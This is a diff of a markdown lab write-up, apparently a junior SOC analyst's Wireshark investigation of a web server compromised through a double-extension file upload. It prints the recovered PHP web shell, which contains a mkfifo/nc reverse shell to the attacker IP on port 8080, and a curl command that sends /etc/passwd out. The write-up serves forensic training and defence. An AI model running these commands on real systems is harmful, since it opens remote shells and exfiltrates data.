@@ -1,81 +1,230 @@
-# Web Server Compromise – PCAP Analysis
+Web Server Compromise & Web Shell Forensic Analysis
 
-## Summary
-A forensic investigation of a compromised web server revealed a malicious web shell upload, reverse shell execution, and attempted data exfiltration.
+Category: Network Forensics | Web Exploitation | SOC Investigation
+Artifact: PCAP File
+Tools Used: Wireshark
+Skill Level: SOC Analyst (Junior)
 
-## Attack Chain
-- Initial access via insecure file upload
-- Web shell deployment
-- Reverse shell connection
-- Attempted exfiltration of sensitive data
+📌 Overview
 
-## Outcome
-The attacker gained temporary remote access and attempted to exfiltrate system files.
+This lab focuses on the forensic investigation of a web server compromise captured in a PCAP file.
+The incident involves the unauthorized upload of a malicious web shell, followed by remote command execution and an attempted data exfiltration.
+
+The purpose of this investigation is to reconstruct the attacker’s actions by analyzing network traffic and identifying:
+
+Initial access attempts
+
+Exploited weaknesses in file upload validation
+
+Reverse shell activity
+
+Data exfiltration attempts
+
+This walkthrough demonstrates how network forensics supports incident response and highlights common attacker techniques used against vulnerable web applications.
+
+🎯 Investigation Objectives
+
+Identify the attacker’s geographic origin
+
+Extract attacker metadata (User-Agent)
+
+Determine how upload validation was bypassed
+
+Identify reverse shell communication details
+
+Detect data exfiltration attempts
+
+Understand attacker intent and impact
+
+🛠 Tools Used
+
+Wireshark
+
+IP Geolocation (external enrichment)
+
+HTTP & TCP stream analysis
+
+🔍 Analysis & Findings
+Q1: Attacker Geographical Origin
+
+Why it matters:
+Geolocation assists with threat intelligence, anomaly detection, and geo-blocking strategies.
+
+Methodology:
+
+Open PCAP in Wireshark
+
+Navigate to Statistics → Endpoints → IPv4
+
+Identify the external source IP communicating with the server
+
+Key IP Identified:
+
+Attacker IP: 117.11.88.124
+
+Victim Server: 24.49.63.79
+
+Using IP geolocation services, the attacker IP resolves to:
+
+📍 Tianjin, China
+
+Conclusion:
+The attack originated from Tianjin, China, providing useful context for threat profiling and defensive controls.
+
+Q2: Attacker User-Agent
+
+Why it matters:
+User-Agent strings help identify attacker tooling and support detection rules.
+
+Methodology:
+
+Follow the HTTP stream between attacker and server
+
+Inspect request headers
+
+Finding:
+
+Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 
 
+Insight:
+The attacker is likely spoofing a legitimate Linux Firefox browser to blend in with normal traffic.
 
-# Web Server Compromise – PCAP Analysis
+Q3: Malicious Web Shell Uploaded
 
-## Summary
-A forensic investigation of a compromised web server revealed a malicious web shell upload, reverse shell execution, and attempted data exfiltration.
+Why it matters:
+Web shells provide persistent access and command execution capabilities.
 
-## Attack Chain
-- Initial access via insecure file upload
-- Web shell deployment
-- Reverse shell connection
-- Attempted exfiltration of sensitive data
+Methodology:
 
-## Outcome
-The attacker gained temporary remote access and attempted to exfiltrate system files.
+Apply filter:
 
+ip.src == 117.11.88.124 && http.request.method == "POST"
 
 
-🔍 investigation-notes.md (THIS IS YOUR MAIN WRITE-UP)
+Observed Activity:
 
-👉 This is where you paste the full detailed analysis you already wrote (the polished version I gave you).
+Initial upload attempt:
 
-Use headers:
+Filename: image.php
 
-Attacker origin
+Result: Rejected (Invalid file format)
 
-User-Agent
+Second upload attempt:
 
-Web shell upload
+Filename: image.jpg.php
 
-Reverse shell
+Result: Successful
 
-Exfiltration attempt
+Finding:
+The malicious web shell uploaded was named:
+
+📂 image.jpg.php
+
+Insight:
+The attacker bypassed file validation by double-extension abuse, exploiting improper server-side checks.
+
+Q4: Upload Directory Used by the Web Application
+
+Why it matters:
+Identifying storage paths is critical for containment and cleanup.
+
+Methodology:
+
+Follow HTTP responses after upload
+
+Observe redirect behavior
+
+Finding:
+
+Files uploaded via /reviews/upload.php
+
+Stored in:
+
+/reviews/uploads/
 
 
+Conclusion:
+The compromised directory used to store uploaded files is:
+
+📁 /reviews/uploads/
+
+Q5: Reverse Shell Communication Port
+
+Why it matters:
+Identifying attacker listening ports helps with firewall rules and threat hunting.
+
+Extracted Web Shell Code:
+
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
 
 
-iocs.md
-# Indicators of Compromise (IOCs)
+Finding:
 
-## IP Addresses
-- 117.11.88.124 (Attacker)
+Reverse shell target port: 8080
 
-## Files
-- image.jpg.php
+Conclusion:
+The web shell attempted to establish outbound communication to the attacker on port 8080.
 
-## Directories
-- /reviews/uploads/
+Q6: Targeted File for Exfiltration
 
-## Network
-- Reverse shell port: 8080
+Why it matters:
+Understanding what data was targeted helps assess breach severity.
+
+Methodology:
+
+Filter traffic:
+
+(tcp.port == 8080) && (ip.src == 24.49.63.79)
 
 
+Follow TCP stream of reverse shell session
 
-detection-gaps.md
-# Detection Gaps & Recommendations
+Observed Command:
 
-## Observed Gaps
-- Weak file upload validation
-- Executable files allowed in upload directory
-- No alerting on outbound reverse shell traffic
+curl -X POST -d /etc/passwd http://117.11.88.124:443/
 
-## Recommendations
-- Enforce strict MIME and extension validation
-- Disable execution in upload directories
-- Monitor outbound connections on non-standard ports
 
+Finding:
+The attacker attempted to exfiltrate:
+
+📄 /etc/passwd
+
+Impact:
+Although it does not contain password hashes, /etc/passwd enables user enumeration and supports privilege escalation.
+
+🧠 Key Takeaways (SOC Perspective)
+
+Improper file validation enables web shell deployment
+
+Double-extension attacks are still highly effective
+
+Reverse shells commonly use high ports (e.g., 8080)
+
+Attackers often target /etc/passwd for reconnaissance
+
+PCAP analysis can fully reconstruct attacker activity
+
+🛡 Defensive Recommendations
+
+Enforce strict server-side file validation
+
+Disable executable permissions in upload directories
+
+Monitor outbound connections from web servers
+
+Alert on suspicious HTTP POST uploads
+
+Inspect User-Agent anomalies
+
+📚 Skills Demonstrated
+
+PCAP analysis with Wireshark
+
+HTTP & TCP stream reconstruction
+
+Web attack detection
+
+Reverse shell identification
+
+Incident doc
